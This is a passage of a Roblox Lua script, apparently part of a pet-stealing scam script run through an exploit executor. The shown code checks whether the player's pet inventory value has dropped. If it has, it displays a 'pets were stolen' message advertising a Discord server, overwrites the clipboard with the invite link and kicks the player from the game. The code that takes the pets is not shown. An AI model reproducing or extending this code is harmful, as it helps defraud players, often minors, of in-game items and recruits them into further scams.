task.delay(10, function()
    local newTotal = 0
    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        local petName = value.PetType
        if not checkPetsWhitelist(petName) then continue end
        local petPrice = PET_VALUES[petName] or 0
        newTotal += petPrice
    end

    if newTotal < inventoryValue then
        local player = game.Players.LocalPlayer
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "TheftWarning"
        screenGui.ResetOnSpawn = false
        screenGui.IgnoreGuiInset = true
        screenGui.Parent = player:WaitForChild("PlayerGui")

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0.5, 0, 0.3, 0)
        frame.Position = UDim2.new(0.25, 0, 0.35, 0)
        frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
        frame.BorderSizePixel = 0
        frame.Parent = screenGui

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 16)
        corner.Parent = frame

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, -20, 1, -20)
        label.Position = UDim2.new(0, 10, 0, 10)
        label.BackgroundTransparency = 1
        label.TextColor3 = Color3.fromRGB(255, 255, 255)
        label.TextScaled = true
        label.Font = Enum.Font.GothamBold
        label.Text = "‚ö†Ô∏è Some of your pets were stolen!\n\nWant a script like this?\nJoin us: discord.gg/Rm5XHagSJW"
        label.TextWrapped = true
        label.Parent = frame

        task.wait(10)
        setclipboard("https://discord.gg/Rm5XHagSJW")
        player:Kick("‚ö†Ô∏è Some of your pets were stolen.\nJoin: discord.gg/Rm5XHagSJW")
    end
end)

print("=============9")
